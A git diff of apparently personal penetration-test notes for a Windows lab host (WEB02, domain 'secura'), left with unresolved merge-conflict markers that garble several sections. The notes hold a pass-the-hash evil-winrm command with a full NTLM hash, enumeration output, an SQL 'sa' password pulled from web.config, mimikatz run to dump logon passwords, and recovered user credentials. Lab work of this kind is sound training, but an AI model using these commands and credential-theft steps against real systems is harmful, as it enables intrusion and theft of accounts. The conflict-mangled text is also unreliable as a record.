@@ -6,7 +6,11 @@
 - C:\Users\Administrator\Desktop\proof.txt
 # Accounts
 ### Administrator
+<<<<<<< HEAD
+`evil-winrm -i 192.168.213.121 -u Administrator -H b2c03054c306ac8fc5f9d188710b0168>`
+=======
 `evil-winrm -i 192.168.213.121 -u Administrator -H b2c03054c306ac8fc5f9d188710b0168`
+>>>>>>> e06fa5ee92d068eeeeae2a07004803d05ab415ed
 ```
 
 ```
@@ -25,6 +29,8 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ## Local Users
 `Get-LocalUser`
 ```
+<<<<<<< HEAD
+=======
 Name               Enabled Description
 ----               ------- -----------
 Administrator      True    Built-in account for administering the computer/domain
@@ -41,11 +47,14 @@ d-----        10/13/2022  11:47 PM                administrator.MEDTECH
 d-----        10/13/2022  11:44 PM                joe
 d-----         9/29/2022   4:29 AM                offsec
 d-r---         9/29/2022   1:57 AM                Public
+>>>>>>> e06fa5ee92d068eeeeae2a07004803d05ab415ed
 
 ```
 ## Local Groups
 `Get-LocalGroup`
 ```
+<<<<<<< HEAD
+=======
 SQLServer2005SQLBrowserUser$WEB02   Members in the group have the required access and privileges to be assigned as the log on account for the associated instance of SQL Server Browser.
 Access Control Assistance Operators Members of this group can remotely query authorization attributes and permissions for resources on this computer.
 Administrators                      Administrators have complete and unrestricted access to the computer/domain
@@ -73,10 +82,13 @@ Storage Replica Administrators      Members of this group have complete and unre
 System Managed Accounts Group       Members of this group are managed by the system.
 Users                               Users are prevented from making accidental or intentional system-wide changes and can run most applications
 
+>>>>>>> e06fa5ee92d068eeeeae2a07004803d05ab415ed
 ```
 ## System Info
 `systeminfo`
 ```
+<<<<<<< HEAD
+=======
 Host Name:                 WEB02
 OS Name:                   Microsoft Windows Server 2022 Standard
 OS Version:                10.0.20348 N/A Build 20348
@@ -125,11 +137,14 @@ Network Card(s):           2 NIC(s) Installed.
                                  IP address(es)
                                  [01]: 172.16.213.254
 Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+>>>>>>> e06fa5ee92d068eeeeae2a07004803d05ab415ed
 
 ```
 ## Routes
 `route print`
 ```
+<<<<<<< HEAD
+=======
 ===========================================================================
 Interface List
   2...00 50 56 86 b6 ea ......vmxnet3 Ethernet Adapter
@@ -173,10 +188,13 @@ Active Routes:
 Persistent Routes:
   None
 
+>>>>>>> e06fa5ee92d068eeeeae2a07004803d05ab415ed
 ```
 ## Netstat
 `netstat -ano`
 ```
+<<<<<<< HEAD
+=======
   Proto  Local Address          Foreign Address        State           PID
   TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
   TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       940
@@ -242,10 +260,17 @@ Persistent Routes:
   UDP    [::1]:1900             *:*                                    5064
   UDP    [::1]:57367            *:*                                    5064
 
+>>>>>>> e06fa5ee92d068eeeeae2a07004803d05ab415ed
 ```
 ## Environment Vars
 `Get-ChildItem Env:`
 ```
+<<<<<<< HEAD
+```
+## Domain Controller Info
+`nltest /dsgetdc:secura`
+```
+=======
 ALLUSERSPROFILE                C:\ProgramData
 APPDATA                        C:\Users\Administrator\AppData\Roaming
 CommonProgramFiles             C:\Program Files\Common Files
@@ -292,6 +317,7 @@ Our Site Name: Default-First-Site-Name
         Flags: PDC GC DS LDAP KDC TIMESERV GTIMESERV WRITABLE DNS_FOREST CLOSE_SITE FULL_SECRET WS DS_8 DS_9 DS_10 KEYLIST
 The command completed successfully
 
+>>>>>>> e06fa5ee92d068eeeeae2a07004803d05ab415ed
 ```
 ## API Endpoints
 `gobuster dir -u http://192.168.159.121:80 -w /usr/share/wordlists/dirb/big.txt -p pattern`
@@ -320,6 +346,9 @@ The command completed successfully
     evil-winrm -i 192.168.213.121 -u Administrator -H b2c03054c306ac8fc5f9d188710b0168
     Get-Command Invoke-Sqlcmd
     Invoke-Sqlcmd -ServerInstance "localhost" -Query "SELECT name FROM sys.sql_logins;"
+<<<<<<< HEAD
+
+=======
     //web.config -> C:\inetpub\wwwroot> cat web.config
     /* <connectionStrings>
                 <add name="myConnectionString" connectionString="server=localhost\SQLEXPRESS;database=webapp;uid=sa;password=WhileChirpTuesday218;Trusted_Connection=False;MultipleActiveResultSets=true; Integrated Security=False; Max Pool Size=500;" />
@@ -335,4 +364,5 @@ The command completed successfully
     // upload mimikatz
     .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
     //found joe / Flowers1
+>>>>>>> e06fa5ee92d068eeeeae2a07004803d05ab415ed
 ```
